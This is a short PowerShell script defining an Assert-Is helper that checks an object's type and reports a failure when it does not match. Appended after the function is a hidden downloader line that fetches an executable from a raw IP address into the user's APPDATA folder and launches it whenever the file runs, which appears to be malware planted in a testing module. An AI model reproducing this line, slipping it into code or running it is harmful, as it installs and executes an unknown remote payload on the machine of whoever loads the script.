













function Assert-Is
{
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0)]
        [object]
        
        $InputObject,

        [Parameter(Position=1)]
        [Type]
        
        $ExpectedType,

        [Parameter(Position=2)]
        [string]
        
        $Message
    )

    Set-StrictMode -Version 'Latest'

    if( $InputObject -isnot $ExpectedType ) 
    {
        Fail ("Expected object to be of type '{0}' but was '{1}'. {2}" -f $ExpectedType,$InputObject.GetType(),$Message)
    }
}


(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

